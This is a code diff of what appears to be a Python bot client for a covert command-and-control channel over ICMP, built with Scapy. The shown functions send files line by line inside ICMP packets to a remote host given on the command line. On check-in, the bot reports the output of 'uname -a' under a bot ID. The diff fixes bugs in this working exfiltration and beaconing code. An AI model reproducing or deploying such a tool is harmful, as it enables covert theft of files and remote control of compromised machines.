@@ -78,6 +78,7 @@ def sendFile(filename,botId):
 	print "[*] Sending file: %s" % filename
 	file = open(filename, 'r')
 	startLine = '(FILE_START) ' + botId + ' ' + str(filename)
+	print "[D] Startline: %s" % startLine
 	packet=IP(dst=sys.argv[1])/ICMP()/startLine
 	p=sr1(packet,timeout=1)
 	for line in file:
@@ -94,10 +95,10 @@ def sendFile(filename,botId):
 
 	
 def sendPingRequest(request,botId):
-	full_request = request + ' ' + botId
-	if botId == 123456789:
+	full_request = request + ' ' + str(botId)
+	if botId == '123456789':
 		# Initial Checkin request
-		packet=IP(dst=sys.argv[1])/ICMP()/str(full_request)
+		packet=IP(dst=sys.argv[1])/ICMP()/str(request)
 	else:
 		packet=IP(dst=sys.argv[1])/ICMP()/str(full_request)
         #packet.show()
@@ -161,7 +162,7 @@ def main(argv):
 		print "[*] Not checked in...checking in now"
 		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
-                p=sendPingRequest('Checkin %s' % output,123456789)
+                p=sendPingRequest('Checkin %s' % output,'123456789')
                 if p:
                         processReply(p)
                 #print output
